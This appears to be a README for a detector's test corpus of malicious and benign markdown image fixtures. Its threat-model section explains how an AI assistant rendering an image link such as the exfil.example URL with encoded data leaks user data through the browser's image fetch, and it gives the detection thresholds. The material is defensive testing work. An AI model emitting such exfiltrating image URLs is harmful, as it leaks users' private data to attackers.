# markdown_image corpus

Targets `PrimitiveMarkdownImage`: markdown image references with
exfil-shaped URLs.

## Threat model

The CamoLeak (CVE-2025-59145) class of attack uses markdown image
syntax to exfiltrate data. An AI assistant that renders a chat
response containing `![alt](https://exfil.example/p?d=BASE64DATA)`
causes the user's browser to fetch the URL — and the URL itself
encodes the exfiltrated payload. The image-render side channel
defeats text-only exfiltration filters because the rendering tool
sees an image fetch, not a data leak.

Detection: URL length > 200 chars OR a single query-param value
> 96 chars. Calibrated above ordinary badge / banner URLs and
below the size of a real per-frame exfil URL.

## Fixture sources

- `camoleak-long-query.malicious.md` — single-image-ref with a
  query-param value over the 96-char threshold. The CamoLeak shape.
- `exfil-long-url.malicious.md` — image URL whose path itself is
  over the 200-char threshold (encoded data in path rather than
  query).
- `shields-badge.benign.md` — conventional [shields.io](https://shields.io/)
  badge URL with short, normal query params (`style=flat`,
  `branch=main`). Must not fire.
- `relative-asset.benign.md` — image with a relative path
  (`./assets/logo.png`). Must not fire.
- `github-raw-png.benign.md` — image hosted on
  `raw.githubusercontent.com` at the conventional URL shape.
  Must not fire.
